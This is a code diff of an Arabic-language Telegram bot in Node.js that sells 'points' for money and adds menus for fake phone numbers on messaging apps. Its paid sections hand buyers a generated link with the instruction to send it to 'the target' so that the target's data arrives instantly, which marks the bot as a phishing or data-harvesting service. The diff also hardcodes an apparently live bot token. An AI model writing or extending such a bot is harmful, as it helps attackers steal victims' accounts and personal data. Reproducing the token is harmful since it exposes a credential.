@@ -3,7 +3,7 @@ const fs = require('fs');
 
 // ⚠️ التوكن بتاعك
 const TOKEN = '8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90';
-const DEVELOPER_ID = 8794777974;
+const DEVELOPER_ID = 8794777974; // الآيدي بتاعك
 const bot = new TelegramBot(TOKEN, { polling: true });
 
 const BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png";
@@ -13,7 +13,7 @@ const USERS_FILE = 'users.json';
 const POINTS_FILE = 'points.json';
 const CHANNELS_FILE = 'channels.json';
 
-// --- إدارة الملفات ---
+// --- دوال التخزين ---
 function loadFile(file, defaultData) {
     if (!fs.existsSync(file)) {
         fs.writeFileSync(file, JSON.stringify(defaultData));
@@ -26,7 +26,6 @@ function saveFile(file, data) {
     fs.writeFileSync(file, JSON.stringify(data, null, 2));
 }
 
-// --- إدارة المستخدمين ---
 function loadUsers() { return loadFile(USERS_FILE, { users: [] }); }
 function saveUsers(data) { saveFile(USERS_FILE, data); }
 function registerUser(userId, name) {
@@ -39,7 +38,6 @@ function registerUser(userId, name) {
     return false;
 }
 
-// --- إدارة النقاط ---
 function loadPoints() { return loadFile(POINTS_FILE, { points: {}, last_daily: {} }); }
 function savePoints(data) { saveFile(POINTS_FILE, data); }
 function getUserPoints(userId) {
@@ -67,14 +65,12 @@ function setDailyClaim(userId) {
     savePoints(data);
 }
 
-// --- إدارة القنوات (الاشتراك الإجباري) ---
 function loadChannels() { return loadFile(CHANNELS_FILE, { channels: [] }); }
 function saveChannels(data) { saveFile(CHANNELS_FILE, data); }
 
 async function isSubscribed(userId) {
     const data = loadChannels();
     if (data.channels.length === 0) return true;
-    
     for (let ch of data.channels) {
         try {
             const member = await bot.getChatMember(ch.id, userId);
@@ -206,7 +202,6 @@ bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
     const name = msg.from.first_name || 'مستخدم';
     const referrer = match[1];
 
-    // --- التحقق من الاشتراك الإجباري ---
     const subscribed = await isSubscribed(chatId);
     if (!subscribed) {
         const channels = loadChannels().channels;
@@ -270,7 +265,6 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
-    // --- التحقق من الاشتراك (زرار التحقق) ---
     if (data === 'check_sub') {
         const subscribed = await isSubscribed(chatId);
         if (subscribed) {
@@ -281,13 +275,11 @@ bot.on('callback_query', async (query) => {
         return;
     }
 
-    // --- التحقق من الاشتراك لباقي الأزرار ---
     const subscribed = await isSubscribed(chatId);
     if (!subscribed) {
         const channels = loadChannels().channels;
         const buttons = channels.map(ch => [{ text: `📢 ${ch.name}`, url: ch.link }]);
         buttons.push([{ text: "✅ تحقق من الاشتراك", callback_data: 'check_sub' }]);
-
         bot.sendMessage(chatId, "⚠️ <b>عذراً، لازم تشترك في القنوات دي الأول عشان تقدر تستخدم البوت:</b>", {
             parse_mode: 'HTML',
             reply_markup: JSON.stringify({ inline_keyboard: buttons })
@@ -386,8 +378,160 @@ bot.on('callback_query', async (query) => {
         return;
     }
 
-    // --- باقي الأزرار (نفس الكود القديم) ---
-    // ... (باقي الأزرار زي ما هي في الكود اللي قبله)
+    // --- النقاط ---
+    if (data === 'my_points') {
+        const points = getUserPoints(chatId);
+        bot.sendMessage(chatId, `💰 <b>نقاطك الحالية:</b> ${points} نقطة`, { parse_mode: 'HTML' });
+    } else if (data === 'collect_points') {
+        bot.sendMessage(chatId, 
+            "🏆 <b>تجميع نقاط</b>\n\n" +
+            "اختر طريقة لجمع النقاط:\n" +
+            "🎗️ ادعُ أصدقاءك واحصل على نقاط\n" +
+            "🎁 احصل على هديتك اليومية", 
+            {
+                parse_mode: 'HTML',
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "🎁 الهدية اليومية", callback_data: 'daily_gift' }],
+                        [{ text: "🎗️ رابط الدعوة", callback_data: 'invite_link' }],
+                        [{ text: "🔴 رجوع", callback_data: 'back_main' }]
+                    ]
+                })
+            }
+        );
+    } else if (data === 'daily_gift') {
+        if (canClaimDaily(chatId)) {
+            addUserPoints(chatId, 1);
+            setDailyClaim(chatId);
+            bot.sendMessage(chatId, `🎁 <b>تم استلام هديتك اليومية!</b>\n\n✅ +1 نقطة\n💥 رصيدك الحالي: ${getUserPoints(chatId)} نقطة`, { parse_mode: 'HTML' });
+        } else {
+            bot.sendMessage(chatId, `⏰ <b>لقد استلمت هديتك اليومية بالفعل!</b>\n💥 رصيدك الحالي: ${getUserPoints(chatId)} نقطة`, { parse_mode: 'HTML' });
+        }
+    } else if (data === 'invite_link') {
+        const botUsername = "heroil_2bot";
+        const inviteLink = `https://t.me/${botUsername}?start=${chatId}`;
+        bot.sendMessage(chatId, `🎗️ <b>رابط الدعوة الخاص بك:</b>\n\n${inviteLink}\n\n💰 <b>ستحصل على 3 نقاط لكل شخص ينضم من رابطك!</b>`, { parse_mode: 'HTML', disable_web_page_preview: true });
+    }
+
+    // --- أسعار النقاط ---
+    else if (data === 'points_store') {
+        bot.sendMessage(chatId, "💳 <b>اختر الباقة المناسبة:</b>", {
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "💵 500 نقطة = 2500 ريال أو 5$", callback_data: 'buy_500' }],
+                    [{ text: "💵 1000 نقطة = 5000 ريال أو 10$", callback_data: 'buy_1000' }],
+                    [{ text: "💵 1500 نقطة = 7500 ريال أو 15$", callback_data: 'buy_1500' }],
+                    [{ text: "💵 2000 نقطة = 10000 ريال أو 20$", callback_data: 'buy_2000' }],
+                    [{ text: "🔴 رجوع", callback_data: 'back_main' }]
+                ]
+            })
+        });
+    } else if (data === 'buy_500') {
+        bot.sendMessage(chatId, `💵 <b>500 نقطة</b>\n\n💰 <b>السعر:</b> 2500 ريال يمني أو 5$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_1000') {
+        bot.sendMessage(chatId, `💵 <b>1000 نقطة</b>\n\n💰 <b>السعر:</b> 5000 ريال يمني أو 10$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_1500') {
+        bot.sendMessage(chatId, `💵 <b>1500 نقطة</b>\n\n💰 <b>السعر:</b> 7500 ريال يمني أو 15$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_2000') {
+        bot.sendMessage(chatId, `💵 <b>2000 نقطة</b>\n\n💰 <b>السعر:</b> 10000 ريال يمني أو 20$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    }
+
+    // --- الأرقام الوهمية ---
+    else if (data === 'fake_num') {
+        bot.sendMessage(chatId, "📱 <b>أرقام وهمية</b>\n\nاختر المنصة:", {
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "📞 أرقام واتساب", callback_data: 'fake_wa' }, { text: "📨 أرقام تلجرام", callback_data: 'fake_tg' }],
+                    [{ text: "📱 أرقام إيمو", callback_data: 'fake_imo' }, { text: "📸 أرقام انستقرام", callback_data: 'fake_ig' }],
+                    [{ text: "🔴 رجوع", callback_data: 'back_main' }]
+                ]
+            })
+        });
+    } else if (data === 'fake_wa' || data === 'fake_tg' || data === 'fake_imo' || data === 'fake_ig') {
+        const platformName = { fake_wa: 'واتساب', fake_tg: 'تلجرام', fake_imo: 'إيمو', fake_ig: 'انستقرام' }[data];
+        bot.sendMessage(chatId, `📱 <b>${platformName} - اختر الدولة:</b>`, {
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "🇸🇦 السعودية", callback_data: `${data}_sa` }],
+                    [{ text: "🇾🇪 اليمن", callback_data: `${data}_ye` }],
+                    [{ text: "🇪🇬 مصر", callback_data: `${data}_eg` }],
+                    [{ text: "🇸🇾 سوريا", callback_data: `${data}_sy` }],
+                    [{ text: "🇮🇶 العراق", callback_data: `${data}_iq` }],
+                    [{ text: "🇺🇸 أمريكا", callback_data: `${data}_us` }],
+                    [{ text: "🇷🇺 روسيا", callback_data: `${data}_ru` }],
+                    [{ text: "🔴 رجوع", callback_data: 'fake_num' }]
+                ]
+            })
+        });
+    } else if (data.includes('_sa') || data.includes('_ye') || data.includes('_eg') || data.includes('_sy') || data.includes('_iq') || data.includes('_us') || data.includes('_ru')) {
+        bot.sendMessage(chatId, "⚠️ <b>هذا القسم قيد التطوير، سيتم إضافة الأرقام قريباً.</b>", { parse_mode: 'HTML' });
+    } else if (data === 'back_main') {
+        bot.sendMessage(chatId, "🔥 <b>اختر القسم المناسب:</b>", { parse_mode: 'HTML', ...getMainKeyboard(chatId) });
+    } else if (data === 'about') {
+        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v5.0</b>", { parse_mode: 'HTML' });
+    } else if (data === 'contact') {
+        bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
+    } else if (data === 'coming_soon') {
+        bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
+    }
+
+    // --- تأكيد فتح الأقسام المدفوعة ---
+    else if (data.startsWith('pay_')) {
+        const sectionKey = data.replace('pay_', '');
+        const price = getSectionPrice(sectionKey);
+        const userPoints = getUserPoints(chatId);
+
+        if (userPoints < price) {
+            bot.sendMessage(chatId, `❌ <b>رصيدك غير كافي!</b>\n\n💥 نقاطك: ${userPoints}\n🔒 تحتاج: ${price} نقطة لفتح القسم.`, { parse_mode: 'HTML' });
+        } else {
+            bot.sendMessage(chatId, 
+                `⚠️ <b>تأكيد الطلب</b>\n\n` +
+                `أنت على وشك فتح قسم: <b>${getSectionName(sectionKey)}</b>\n\n` +
+                `💰 التكلفة: ${price} نقطة\n` +
+                `💥 رصيدك الحالي: ${userPoints} نقطة\n\n` +
+                `هل أنت موافق؟`,
+                {
+                    parse_mode: 'HTML',
+                    reply_markup: JSON.stringify({
+                        inline_keyboard: [
+                            [{ text: "🟢 موافق", callback_data: `confirm_${sectionKey}` }],
+                            [{ text: "🔴 إلغاء", callback_data: 'cancel' }]
+                        ]
+                    })
+                }
+            );
+        }
+    }
+
+    // --- تنفيذ الطلب بعد التأكيد ---
+    else if (data.startsWith('confirm_')) {
+        const sectionKey = data.replace('confirm_', '');
+        const price = getSectionPrice(sectionKey);
+        const link = getLink(sectionKey, chatId);
+
+        if (!link) {
+            bot.sendMessage(chatId, "🛠️ هذا القسم قيد التطوير حالياً.", { parse_mode: 'HTML' });
+            return;
+        }
+
+        addUserPoints(chatId, -price);
+        const title = getSectionTitle(sectionKey);
+
+        bot.sendMessage(chatId, 
+            `💀 <b>${title}</b> 💀\n\n` +
+            `🔗 <b>الرابط جاهز:</b>\n\n${link}\n\n` +
+            `📌 <b>أرسـل الـرابـط لـلـهـدف • وستوصلك البيانات فوراً 🔥</b>`, 
+            {
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            }
+        );
+    } else if (data === 'cancel') {
+        bot.sendMessage(chatId, "❌ <b>تم إلغاء الطلب.</b>", { parse_mode: 'HTML' });
+    }
 
     bot.answerCallbackQuery(query.id);
 });
@@ -397,7 +541,6 @@ let lastPointsUpdate = 0;
 bot.onText(/\/addpoints/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId !== DEVELOPER_ID) return;
-
     const now = Date.now();
     if (now - lastPointsUpdate < 2000) return; 
     lastPointsUpdate = now;
@@ -421,7 +564,6 @@ bot.onText(/\/addpoints/, (msg) => {
 bot.onText(/\/resetpoints/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId !== DEVELOPER_ID) return;
-
     const args = msg.text.split(' ');
     if (args.length === 2) {
         const targetId = parseInt(args[1]);
@@ -432,4 +574,4 @@ bot.onText(/\/resetpoints/, (msg) => {
     }
 });
 
-console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع لوحة الأدمن المتقدمة)");
+console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة النهائية)");
